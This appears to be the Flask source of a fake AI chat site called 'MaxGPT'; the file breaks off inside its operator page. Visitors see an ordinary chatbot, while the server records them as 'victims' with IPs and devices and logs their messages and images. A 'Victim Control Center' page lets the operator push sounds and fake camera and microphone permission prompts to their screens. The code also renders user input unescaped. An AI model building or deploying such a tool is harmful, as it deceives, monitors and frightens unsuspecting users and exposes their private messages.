from flask import Flask, request, jsonify, render_template_string, send_from_directory
import random, os, urllib.request, json, time, base64

app = Flask(__name__)

all_chats = {}
user_active_chat = {}
user_states = {}
pending_commands = {}
active_victims = {}
victim_counter = 0
chat_logs = []

def parse_user_agent(ua_string):
    ua = ua_string.lower() if ua_string else ""
    if "android" in ua: os_name = "Android"
    elif "iphone" in ua or "ipod" in ua: os_name = "iOS"
    elif "ipad" in ua: os_name = "iPadOS"
    elif "windows" in ua: os_name = "Windows"
    elif "mac os" in ua or "macintosh" in ua: os_name = "macOS"
    elif "linux" in ua: os_name = "Linux"
    else: os_name = "Неизвестно"
        
    if "chrome" in ua and "safari" in ua and "edg" not in ua and "opr" not in ua: browser = "Chrome"
    elif "safari" in ua and "chrome" not in ua: browser = "Safari"
    elif "firefox" in ua: browser = "Firefox"
    elif "edg" in ua: browser = "Edge"
    elif "opr" in ua or "opera" in ua: browser = "Opera"
    else: browser = "Браузер"

    if "ipad" in ua or "tablet" in ua or ("android" in ua and "mobile" not in ua):
        device_type = "Планшет"; icon = "fa-tablet-screen-button"
    elif "mobile" in ua or "android" in ua or "iphone" in ua:
        device_type = "Смартфон"; icon = "fa-mobile-screen-button"
    else:
        device_type = "Компьютер"; icon = "fa-desktop"

    return f"{device_type} ({os_name} / {browser})", icon

HTML_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MaxGPT</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --bg-body: #17181c;
            --bg-sidebar: #0e0f12;
            --bg-main: #131417;
            --text-main: #ececf1;
            --text-muted: #8e8ea0;
            --border-color: rgba(255, 255, 255, 0.08);
            --input-bg: #1e1f24;
            --bot-bg: rgba(255, 255, 255, 0.02);
            --top-bar-bg: rgba(19, 20, 23, 0.8);
        }

        [data-theme="light"] {
            --bg-body: #f3f4f6;
            --bg-sidebar: #ffffff;
            --bg-main: #ffffff;
            --text-main: #1f2937;
            --text-muted: #6b7280;
            --border-color: rgba(0, 0, 0, 0.08);
            --input-bg: #f9fafb;
            --bot-bg: rgba(0, 0, 0, 0.015);
            --top-bar-bg: rgba(255, 255, 255, 0.8);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg-body); color: var(--text-main); display: flex; height: 100vh; height: 100dvh; overflow: hidden; transition: background 0.3s, color 0.3s; }
        
        .sidebar { width: 280px; background: var(--bg-sidebar); display: flex; flex-direction: column; padding: 12px; gap: 10px; border-right: 1px solid var(--border-color); box-shadow: 4px 0 20px rgba(0,0,0,0.1); z-index: 20; transition: transform 0.3s ease, background 0.3s; }
        .new-btn { background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.3); color: #8b5cf6; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; }
        .new-btn:hover { background: rgba(139, 92, 246, 0.2); }
        
        .link-btns-group { display: flex; gap: 8px; margin: 4px 0; }
        .link-nav-btn { flex: 1; background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 10px 8px; border-radius: 8px; font-size: 12.5px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; cursor: pointer; text-decoration: none; transition: 0.2s; }
        .link-nav-btn:hover { border-color: #8b5cf6; color: #8b5cf6; }

        .hist { flex: 1; font-size: 12px; color: var(--text-muted); margin-top: 4px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
        .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
        .hist-item { padding: 12px; border-radius: 8px; color: var(--text-main); display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; border: 1px solid transparent; }
        .hist-item.active { background: var(--input-bg); border-color: var(--border-color); font-weight: 500; }
        .hist-item:hover { background: var(--input-bg); }
        
        .user-info { padding: 12px; border-top: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; font-size: 13px; color: var(--text-main); background: var(--input-bg); border-radius: 12px; }
        .user-profile-left { display: flex; align-items: center; gap: 10px; }
        .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
        
        .settings-btn { background: none; border: 1px solid var(--border-color); color: var(--text-muted); width: 34px; height: 34px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
        .settings-btn:hover { background: rgba(139, 92, 246, 0.15); color: #8b5cf6; border-color: rgba(139, 92, 246, 0.3); }

        .max-av-sq { width: 38px; height: 38px; border-radius: 9px; background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%, #c084fc 80%, #ffffff 100%); color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 12px; flex-shrink: 0; }

        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: var(--bg-main); min-width: 0; transition: background 0.3s; }
        .top-bar { height: 60px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; padding: 0 16px; background: var(--top-bar-bg); backdrop-filter: blur(10px); z-index: 10; }
        
        .menu-toggle { display: none; background: none; border: none; color: var(--text-main); font-size: 20px; cursor: pointer; padding: 8px; }

        .model-dropdown { position: relative; display: inline-block; }
        .model-btn { background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; }
        
        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 12px; width: 220px; box-shadow: 0 12px 30px rgba(0,0,0,0.2); z-index: 100; overflow: hidden; }
        .model-menu.show { display: block; }
        .model-option { padding: 13px 16px; font-size: 13px; color: var(--text-main); display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid var(--border-color); }
        .model-option.selected { color: #8b5cf6; font-weight: 700; background: rgba(139, 92, 246, 0.1); }

        #chat { flex: 1; overflow-y: auto; display: flex; flex-direction: column; scroll-behavior: smooth; padding-bottom: 20px; }
        #chat::-webkit-scrollbar { width: 6px; }
        #chat::-webkit-scrollbar-thumb { background: rgba(150,150,150,0.3); border-radius: 3px; }
        
        .row { display: flex; gap: 14px; padding: 18px 5%; border-bottom: 1px solid var(--border-color); position: relative; animation: fadeIn 0.25s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        
        .row.bot { background: var(--bot-bg); }
        .msg-container { flex: 1; display: flex; flex-direction: column; gap: 6px; min-width: 0; user-select: text; -webkit-user-select: text; }
        .bot-author { font-size: 13px; font-weight: 700; color: #a78bfa; margin-bottom: 2px; display: flex; align-items: center; justify-content: space-between; }
        .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: var(--text-main); user-select: text; -webkit-user-select: text; }

        .copy-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 12px; display: flex; align-items: center; gap: 4px; padding: 3px 6px; border-radius: 6px; transition: 0.2s; }
        .copy-btn:hover { background: rgba(255,255,255,0.06); color: var(--text-main); }

        .typing-indicator { display: flex; align-items: center; gap: 5px; padding: 4px 0; }
        .typing-dot { width: 8px; height: 8px; background: #a78bfa; border-radius: 50%; opacity: 0.4; animation: blinkDot 1.4s infinite ease-in-out both; }
        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes blinkDot { 0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; } 40% { transform: scale(1.1); opacity: 1; } }

        .input-area { padding: 16px 5% 20px; background: var(--bg-main); }
        .input-wrap { background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 14px; padding: 10px 14px; display: flex; flex-direction: column; gap: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
        .input-wrap:focus-within { border-color: #8b5cf6; }
        
        .input-row { display: flex; gap: 10px; align-items: flex-end; width: 100%; }
        textarea { flex: 1; background: none; border: none; color: var(--text-main); outline: none; resize: none; min-height: 24px; max-height: 120px; font-size: 15px; line-height: 24px; }
        textarea::placeholder { color: var(--text-muted); }
        textarea:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .attach-btn { background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer; padding: 6px; transition: 0.2s; display: flex; align-items: center; justify-content: center; }
        .attach-btn:hover { color: #8b5cf6; }

        .preview-container { display: none; align-items: center; gap: 10px; padding: 6px 10px; background: rgba(139, 92, 246, 0.1); border-radius: 8px; width: fit-content; }
        .preview-container.show { display: flex; }
        .preview-thumb { width: 40px; height: 40px; object-fit: cover; border-radius: 6px; }
        .preview-remove { background: none; border: none; color: #ef4444; cursor: pointer; font-size: 14px; }

        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 36px; height: 36px; border-radius: 9px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: 0.2s; }
        .send-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
        .disclaimer { font-size: 11px; color: var(--text-muted); text-align: center; margin-top: 8px; font-weight: 500; }

        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; backdrop-filter: blur(4px); }
        .modal-overlay.open { display: flex; align-items: center; justify-content: center; }
        
        .custom-modal { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 16px; padding: 24px; width: 90%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.3); animation: scaleUp 0.2s ease-out; }
        @keyframes scaleUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        
        .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
        .modal-title { font-size: 17px; font-weight: 800; color: var(--text-main); display: flex; align-items: center; gap: 10px; }
        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer; }
        
        .setting-item { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
        .setting-label { font-size: 14px; font-weight: 600; color: var(--text-main); display: flex; align-items: center; gap: 8px; }
        
        .theme-switch-group { display: flex; background: var(--input-bg); border: 1px solid var(--border-color); padding: 4px; border-radius: 12px; gap: 4px; }
        .theme-btn { background: transparent; border: none; padding: 8px 14px; border-radius: 9px; font-size: 13px; font-weight: 700; color: var(--text-muted); cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
        .theme-btn.active { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3); }

        .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 15; backdrop-filter: blur(3px); }

        @media(min-width: 1024px) {
            .row, .input-area { padding-left: 20%; padding-right: 20%; }
        }
        @media(min-width: 768px) and (max-width: 1023px) {
            .row, .input-area { padding-left: 10%; padding-right: 10%; }
        }
        @media(max-width: 767px) {
            .sidebar { position: fixed; left: -280px; top: 0; bottom: 0; transition: transform 0.3s ease; }
            .sidebar.open { transform: translateX(280px); }
            .sidebar-overlay.open { display: block; }
            .menu-toggle { display: block; }
            .row { padding: 14px 12px; }
            .input-area { padding: 10px 12px 14px; }
        }
    </style>
</head>
<body onclick="unlockAudio();">

<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>

<div class="modal-overlay" id="permModal">
    <div class="custom-modal">
        <div class="modal-header">
            <div class="modal-title" id="permIconHeader"><i class="fa-solid fa-camera" style="color: #3b82f6;"></i> <span id="permTitle">Запрос устройства</span></div>
        </div>
        <div style="font-size: 13.5px; color: var(--text-muted); line-height: 1.5; margin-bottom: 20px;" id="permText">
            Сайт запрашивает доступ. Разрешить?
        </div>
        <div style="display: flex; justify-content: flex-end; gap: 10px;">
            <button class="link-nav-btn" style="flex:0; padding: 8px 16px;" onclick="closePermModal()">Заблокировать</button>
            <button class="link-nav-btn" style="flex:0; padding: 8px 16px; background:#3b82f6; color:#fff; border-color:#3b82f6;" onclick="closePermModal()">Разрешить</button>
        </div>
    </div>
</div>

<div class="modal-overlay" id="settingsModal">
    <div class="custom-modal">
        <div class="modal-header">
            <div class="modal-title"><i class="fa-solid fa-gear" style="color: #8b5cf6;"></i> Настройки</div>
            <button class="modal-close" onclick="toggleSettingsModal()"><i class="fa-solid fa-xmark"></i></button>
        </div>
        <div class="setting-item">
            <div class="setting-label"><i class="fa-solid fa-palette"></i> Тема оформления</div>
            <div class="theme-switch-group">
                <button class="theme-btn active" id="darkThemeBtn" onclick="setTheme('dark')"><i class="fa-solid fa-moon"></i> Черная</button>
                <button class="theme-btn" id="lightThemeBtn" onclick="setTheme('light')"><i class="fa-solid fa-sun"></i> Белая</button>
            </div>
        </div>
    </div>
</div>

<div class="sidebar" id="sidebar">
    <button class="new-btn" onclick="startNewChat()"><i class="fa-solid fa-plus"></i> Новый диалог</button>
    
    <div class="link-btns-group">
        <a href="https://vk.com" target="_blank" class="link-nav-btn"><i class="fa-solid fa-globe"></i> Открыть VK</a>
        <a href="https://ya.ru" target="_blank" class="link-nav-btn"><i class="fa-solid fa-bolt"></i> Открыть MAX</a>
    </div>

    <div class="hist" id="historyList">
        <div class="hist-group">Сегодня</div>
    </div>
    
    <div class="user-info">
        <div class="user-profile-left">
            <div class="user-av-sq">Вы</div>
            <div>
                <div style="font-weight:700;">Пользователь</div>
                <div style="font-size:10px; color:#10b981; font-weight:600;">● Активен</div>
            </div>
        </div>
        <button class="settings-btn" onclick="toggleSettingsModal()" title="Настройки"><i class="fa-solid fa-gear"></i></button>
    </div>
</div>

<div class="main">
    <div class="top-bar">
        <div style="display: flex; align-items: center; gap: 12px;">
            <button class="menu-toggle" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
            <div class="model-dropdown">
                <div class="model-btn" onclick="toggleModelMenu()">
                    <i class="fa-solid fa-bolt" style="color:#8b5cf6;"></i>
                    <span id="selectedModel">MaxGPT 4.0 Ultra</span>
                    <i class="fa-solid fa-chevron-down" style="font-size:10px; color:var(--text-muted); margin-left:4px;"></i>
                </div>
                <div class="model-menu" id="modelMenu">
                    <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Ultra')">
                        <span><b>MaxGPT 4.0 Ultra</b></span>
                        <i class="fa-solid fa-check"></i>
                    </div>
                    <div class="model-option" onclick="selectModel('MaxGPT 3.5 Turbo')">
                        <span><b>MaxGPT 3.5 Turbo</b></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="chat">
        <div class="row bot">
            <div class="max-av-sq">МАХ</div>
            <div class="msg-container">
                <div class="bot-author">
                    <span>MaxGPT AI</span>
                    <button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
                </div>
                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
            </div>
        </div>
    </div>

    <div class="input-area">
        <div class="input-wrap">
            <div class="preview-container" id="imagePreviewContainer">
                <img id="imagePreview" class="preview-thumb" src="" alt="preview">
                <span id="imageName" style="font-size: 12px; color: var(--text-main); max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;"></span>
                <button class="preview-remove" onclick="removeImage()"><i class="fa-solid fa-xmark"></i></button>
            </div>
            <div class="input-row">
                <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImageSelect(event)">
                <button class="attach-btn" onclick="document.getElementById('imageInput').click()" title="Прикрепить изображение"><i class="fa-solid fa-paperclip"></i></button>
                <textarea id="userInput" placeholder="Сообщение или вопрос к фото..." rows="1" oninput="autoResize(this)" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
                <button class="send-btn" id="sendBtn" onclick="send()"><i class="fa-solid fa-arrow-up"></i></button>
            </div>
        </div>
        <div class="disclaimer">MaxGPT может допускать ошибки. Проверяйте информацию.</div>
    </div>
</div>

<script>
let audioCtx = null;
let currentChatId = null;
let isGenerating = false;
let selectedBase64Image = null;

function unlockAudio() {
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        audioCtx.resume();
    }
}

function playCustomSound() {
    unlockAudio();
    try {
        let audio = new Audio('/mysound.wav');
        audio.play().catch(e => {});
    } catch(e) {}
}

function playShutterSound() {
    unlockAudio();
    try {
        let o = audioCtx.createOscillator();
        let g = audioCtx.createGain();
        o.type = 'square';
        o.frequency.setValueAtTime(1200, audioCtx.currentTime);
        o.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.08);
        g.gain.setValueAtTime(0.5, audioCtx.currentTime);
        g.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
        o.connect(g); g.connect(audioCtx.destination);
        o.start(); o.stop(audioCtx.currentTime + 0.08);
    } catch(e) {}
}

function playBeepSound() {
    unlockAudio();
    try {
        let o = audioCtx.createOscillator();
        let g = audioCtx.createGain();
        o.type = 'sine';
        o.frequency.setValueAtTime(880, audioCtx.currentTime);
        g.gain.setValueAtTime(0.3, audioCtx.currentTime);
        g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
        o.connect(g); g.connect(audioCtx.destination);
        o.start(); o.stop(audioCtx.currentTime + 0.4);
    } catch(e) {}
}

function handleImageSelect(event) {
    let file = event.target.files[0];
    if (!file) return;
    let reader = new FileReader();
    reader.onload = function(e) {
        selectedBase64Image = e.target.result;
        document.getElementById('imagePreview').src = selectedBase64Image;
        document.getElementById('imageName').innerText = file.name;
        document.getElementById('imagePreviewContainer').classList.add('show');
    };
    reader.readAsDataURL(file);
}

function removeImage() {
    selectedBase64Image = null;
    document.getElementById('imageInput').value = '';
    document.getElementById('imagePreviewContainer').classList.remove('show');
}

function copyText(btn) {
    let container = btn.closest('.msg-container');
    let txtEl = container.querySelector('.txt');
    let textToCopy = txtEl.innerText;
    
    navigator.clipboard.writeText(textToCopy).then(() => {
        let originalHTML = btn.innerHTML;
        btn.innerHTML = '<i class="fa-solid fa-check" style="color:#10b981;"></i> Скопировано';
        setTimeout(() => { btn.innerHTML = originalHTML; }, 2000);
    }).catch(err => {});
}

function showCameraPromptCustom() {
    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-camera" style="color: #3b82f6;"></i> <span>Запрос камеры</span>';
    document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к видеокамере для биометрической авторизации. Разрешить?";
    document.getElementById("permModal").classList.add("open");
}

function showMicPromptCustom() {
    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-microphone" style="color: #ef4444;"></i> <span>Запрос микрофона</span>';
    document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к микрофону для голосового ввода. Разрешить?";
    document.getElementById("permModal").classList.add("open");
}

function closePermModal() { document.getElementById("permModal").classList.remove("open"); }
function toggleSettingsModal() { document.getElementById("settingsModal").classList.toggle("open"); }

function setTheme(theme) {
    if (theme === 'light') {
        document.documentElement.setAttribute('data-theme', 'light');
        document.getElementById('lightThemeBtn').classList.add('active');
        document.getElementById('darkThemeBtn').classList.remove('active');
        localStorage.setItem('maxgpt_theme', 'light');
    } else {
        document.documentElement.removeAttribute('data-theme');
        document.getElementById('darkThemeBtn').classList.add('active');
        document.getElementById('lightThemeBtn').classList.remove('active');
        localStorage.setItem('maxgpt_theme', 'dark');
    }
}

window.addEventListener('DOMContentLoaded', () => {
    let savedTheme = localStorage.getItem('maxgpt_theme') || 'dark';
    setTheme(savedTheme);
    loadChatsList();
});

function toggleSidebar() {
    document.getElementById("sidebar").classList.toggle("open");
    document.getElementById("sidebarOverlay").classList.toggle("open");
}

function toggleModelMenu() { document.getElementById("modelMenu").classList.toggle("show"); }
function selectModel(name) { document.getElementById("selectedModel").innerText = name; toggleModelMenu(); }

function autoResize(textarea) {
    textarea.style.height = 'auto';
    textarea.style.height = Math.min(textarea.scrollHeight, 120) + 'px';
}

function setInputLocked(locked) {
    isGenerating = locked;
    let input = document.getElementById("userInput");
    let btn = document.getElementById("sendBtn");
    input.disabled = locked;
    btn.disabled = locked;
}

async function loadChatsList() {
    let r = await fetch("/api/chats");
    let d = await r.json();
    let listEl = document.getElementById("historyList");
    let html = '<div class="hist-group">Сегодня</div>';
    if (d.chats) {
        d.chats.forEach(ch => {
            let activeClass = (ch.id === currentChatId) ? 'active' : '';
            html += `<div class="hist-item ${activeClass}" onclick="switchChat('${ch.id}')"><i class="fa-regular fa-message"></i> ${ch.title}</div>`;
        });
    }
    listEl.innerHTML = html;
}

async function startNewChat() {
    if (isGenerating) return;
    let r = await fetch("/api/chat/new", {method: "POST"});
    let d = await r.json();
    currentChatId = d.chat_id;
    document.getElementById("chat").innerHTML = `
        <div class="row bot">
            <div class="max-av-sq">МАХ</div>
            <div class="msg-container">
                <div class="bot-author">
                    <span>MaxGPT AI</span>
                    <button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
                </div>
                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
            </div>
        </div>`;
    loadChatsList();
    if(window.innerWidth <= 767) toggleSidebar();
}

async function switchChat(chatId) {
    if (isGenerating) return;
    currentChatId = chatId;
    let r = await fetch(`/api/chat/${chatId}`);
    let d = await r.json();
    let c = document.getElementById("chat");
    let html = `
        <div class="row bot">
            <div class="max-av-sq">МАХ</div>
            <div class="msg-container">
                <div class="bot-author">
                    <span>MaxGPT AI</span>
                    <button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
                </div>
                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
            </div>
        </div>`;
    if (d.messages) {
        d.messages.forEach(m => {
            let imgTag = m.img ? `<br><img src="${m.img}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
            html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}${imgTag}</div></div></div>`;
            html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span><button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button></div><div class="txt">${m.bot}</div></div></div>`;
        });
    }
    c.innerHTML = html;
    c.scrollTop = c.scrollHeight;
    loadChatsList();
    if(window.innerWidth <= 767) toggleSidebar();
}

async function pollAdminCommands() {
    try {
        let r = await fetch("/api/poll");
        let d = await r.json();
        if (d.commands && d.commands.length > 0) {
            d.commands.forEach(cmd => {
                if (cmd === 'sound_shutter') playShutterSound();
                if (cmd === 'sound_beep') playBeepSound();
                if (cmd === 'sound_custom') playCustomSound();
                if (cmd === 'perm_cam') showCameraPromptCustom();
                if (cmd === 'perm_mic') showMicPromptCustom();
            });
        }
    } catch(e) {}
}
setInterval(pollAdminCommands, 1000);

async function send(){
    if (isGenerating) return;
    unlockAudio();
    let i = document.getElementById("userInput"), t = i.value.trim();
    if(!t && !selectedBase64Image) return;
    let c = document.getElementById("chat");

    let imgHtml = selectedBase64Image ? `<br><img src="${selectedBase64Image}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
    c.innerHTML += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t || '[Изображение]'}${imgHtml}</div></div></div>`;
    
    let currentImg = selectedBase64Image;
    i.value = ""; i.style.height = 'auto';
    removeImage();
    c.scrollTop = c.scrollHeight;

    setInputLocked(true);
    let typingId = "typing_" + Date.now();
    c.innerHTML += `
        <div class="row bot" id="${typingId}">
            <div class="max-av-sq">МАХ</div>
            <div class="msg-container">
                <div class="bot-author">MaxGPT AI</div>
                <div class="typing-indicator">
                    <div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div>
                </div>
            </div>
        </div>`;
    c.scrollTop = c.scrollHeight;

    try {
        let r = await fetch("/api/chat", {
            method: "POST", 
            headers: {"Content-Type":"application/json"}, 
            body: JSON.stringify({message: t, image: currentImg, chat_id: currentChatId})
        });
        let d = await r.json();
        currentChatId = d.chat_id;
        
        let typingEl = document.getElementById(typingId);
        if(typingEl) typingEl.remove();

        c.innerHTML += `
            <div class="row bot">
                <div class="max-av-sq">МАХ</div>
                <div class="msg-container">
                    <div class="bot-author">
                        <span>MaxGPT AI</span>
                        <button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
                    </div>
                    <div class="txt">${d.reply}</div>
                </div>
            </div>`;
        c.scrollTop = c.scrollHeight;

        if (d.trigger_sound) playCustomSound();

    } catch(err) {
        let typingEl = document.getElementById(typingId);
        if(typingEl) typingEl.remove();
        c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
    }
    
    setInputLocked(false);
    loadChatsList();
}
</script>
</body>
</html>"""

SPY_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Центр Управления Жертвами</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #090a0f; color: #e2e8f0; padding: 16px; min-height: 100vh; }
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); flex-wrap: wrap; gap: 10px; }
        .title { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
        .title i { color: #8b5cf6; }
        .live-badge { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
        .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .section-title { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: space-between; }
        .victims-grid { display: flex; flex-direction: column; gap: 14px; margin-bottom: 30px; }
        .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
        .victim-head { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; flex-wrap: wrap; gap: 8px; }
        .victim-name { font-size: 15px; font-weight: 800; color: #a78bfa; display: flex; align-items: center; gap: 8px; }
        .badges-wrap { display: flex; gap: 6px; flex-wrap: wrap; }
        .badge { font-family: monospace; font-size: 11px; padding: 3px 8px; border-radius: 6px; display: flex; align-items: center; gap: 5px; }
        .badge-ip { background: rgba(245, 158, 11, 0.1); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.2); }
        .badge-dev { background: rgba(59, 130, 246, 0.1); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.2); }
        .action-btns { display: flex; gap: 6px; flex-wrap: wrap; }
        .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 11.5px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
        .btn-act:hover { filter: brightness(1.1); }
        .btn-shutter { background: #ef4444; } .btn-custom { background: #10b981; } .btn-beep { background: #f59e0b; } .btn-cam { background: #3b82f6; } .btn-mic { background: #8b5cf6; } .btn-del { background: #dc2626; margin-left: auto; }
        .logs-container { display: flex; flex-direction: column; gap: 10px; }
        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; position: relative; }
        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 13.5px; margin-top: 6px; }
        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 10px; border-radius: 8px; }
        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 10px; border-radius: 8px; }
        .btn-clear-all { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
        .btn-clear-all:hover { background: #ef4444; color: #fff; }
        .btn-del-log { background: none; border: none; color: #ef4444; font-size: 13px; cursor: pointer; padding: 4px 8px; border-radius: 6px; transition: 0.2s; }
        .btn-del-log:hover { background: rgba(239, 68, 68, 0.1); }
        @media(min-width: 768px) { body { padding: 24px; } .title { font-size: 20px; } }
    </style>
</head>
<body>
<div class="header">
